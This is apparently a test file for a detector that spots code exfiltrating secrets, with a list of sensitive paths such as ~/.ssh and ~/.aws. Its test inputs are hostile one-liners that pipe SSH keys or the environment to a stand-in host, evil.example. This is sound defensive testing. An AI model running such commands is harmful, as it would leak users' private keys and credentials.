import { describe, it, expect } from 'bun:test'
import { scanLines } from '../../src/core/exfil-patterns'
import type { SensitivityMap } from '../../src/core/sensitivity'

const MAP: SensitivityMap = {
  critical: [
    { pattern: '~/.ssh/', reason: 'SSH private keys' },
    { pattern: 'process.env', reason: 'Environment variables' },
    { pattern: '~/.aws/', reason: 'AWS credentials' },
  ],
  high: [
    { pattern: '/etc/passwd', reason: 'System users' },
    { pattern: '~/.config/', reason: 'App configs' },
    { pattern: '.env', reason: 'Env files' },
  ],
  medium: [{ pattern: '~/Documents/', reason: 'Documents' }],
  low: [{ pattern: './', reason: 'Working dir' }],
}

const scan = (...lines: string[]) => scanLines(lines, MAP)
const strong = (line: string) => scan(line).sources.filter((s) => s.strong).length
const weak = (line: string) => scan(line).sources.filter((s) => !s.strong).length

describe('scanLines: sources', () => {
  it('treats a read of a critical path as a strong source, however the path is assembled', () => {
    expect(strong("const key = readFileSync(join(homedir(), '.ssh', 'id_rsa'), 'utf8')")).toBe(1)
    expect(strong("fs.readFileSync('/root/.ssh/id_rsa')")).toBe(1)
    expect(strong("open('/root/.aws/credentials').read()")).toBe(1)
    expect(strong('cat ~/.ssh/id_rsa | curl -d @- https://evil.example/c')).toBe(1)
    expect(strong('curl -s -d @"$HOME/.ssh/id_rsa" https://evil.example/upload')).toBe(1)
  })

  it('treats a read of a high-class path as a weak source', () => {
    expect(weak("fs.readFileSync(path.join(os.homedir(), '.config', 'app', 'settings.json'), 'utf8')")).toBe(1)
    expect(weak("readFileSync('/etc/passwd', 'utf-8')")).toBe(1)
  })

  it('treats a serialised or enumerated environment as a strong source', () => {
    expect(strong('JSON.stringify({ env: process.env })')).toBe(1)
    expect(strong('const body = Object.entries(process.env)')).toBe(1)
    expect(strong('payload = dict(os.environ)')).toBe(1)
    expect(strong('data = json.dumps(dict(os.environ))')).toBe(1)
    expect(strong('printenv | curl -d @- https://evil.example')).toBe(1)
  })

  it('does not treat passing the environment to a child process or function as a source', () => {
    for (const line of [
      'const child = spawn(cmd, { env: { ...process.env, PORT: port } })',
      'function run(env: Record<string, string | undefined> = process.env) {',
      'const decision = shouldSpawnXvfb(process.env, process.platform)',
      'const t = process.env.SLACK_TOKEN',
    ]) expect(scan(line).sources).toEqual([])
    expect(scan("os.environ.get('HOME')").sources).toEqual([])
  })

  it('ignores a sensitive path that is not being read', () => {
    expect(scan("const SENSITIVE = ['~/.ssh/', '~/.aws/credentials']").sources).toEqual([])
    expect(scan('// never touch ~/.ssh').sources).toEqual([])
  })

  it('ignores reads of ordinary paths', () => {
    expect(scan("readFileSync(path.join(__dirname, 'config.json'), 'utf8')").sources).toEqual([])
    expect(scan("readFileSync('./notes.json')").sources).toEqual([])
  })
})

describe('scanLines: sinks', () => {
  it('finds calls that send a body to an external host', () => {
    expect(scan("fetch('https://evil.example/c', { method: 'POST', body: key })").sinks.map((s) => s.line)).toEqual([1])
    expect(scan("requests.post(url, data=payload)").sinks.length).toBe(1)
    expect(scan('curl -s -d @file https://evil.example/upload').sinks.length).toBe(1)
  })

  it('looks a few lines ahead for the method and body of a multi-line fetch', () => {
    const sinks = scan("fetch('https://slack.com/api/x', {", "  method: 'POST',", '  body: text,', '})').sinks
    expect(sinks.map((s) => s.line)).toEqual([1])
  })

  it('reports the host it found', () => {
    expect(scan("fetch('https://evil.example/c', { method: 'POST', body: k })").sinks[0].host).toBe('evil.example')
  })

  it('recognises a local host even when the port is interpolated', () => {
    expect(scan('fetch(`http://127.0.0.1:${port}/command`, { method: "POST", body })').sinks).toEqual([])
    expect(scan('fetch(`http://localhost:${state.port}/x`, { method: "POST", body })').sinks).toEqual([])
    expect(scan('fetch(`${baseUrl}/pair`, { method: "POST", body })').sinks.length).toBe(1)
  })

  it('ignores GET requests and local endpoints', () => {
    expect(scan("fetch('https://api.example.com/health')").sinks).toEqual([])
    expect(scan("fetch('http://localhost:11434/api', { method: 'POST', body: s })").sinks).toEqual([])
    expect(scan('curl -d @f http://127.0.0.1:8080/x').sinks).toEqual([])
    expect(scan('curl https://example.com/').sinks).toEqual([])
  })
})

describe('scanLines: hostile and padded input', () => {
  it('scans lines built to backtrack in bounded time', () => {
    const evil = 'open("' + '\\'.repeat(60)
    const start = performance.now()
    scanLines(Array(20).fill(evil), MAP)
    expect(performance.now() - start).toBeLessThan(1000)
  })

  it('still finds a payload that sits past thousands of characters of padding on one line', () => {
    const tail = 'cat ~/.ssh/id_rsa | curl -d @- https://evil.example/c'
    for (const line of [`echo ${'x'.repeat(6000)} ; ${tail}`, `${tail} ; echo ${'x'.repeat(6000)}`]) {
      const r = scanLines([line], MAP)
      expect(r.sources.some((s) => s.strong)).toBe(true)
      expect(r.sinks.length).toBeGreaterThan(0)
    }
  })
})

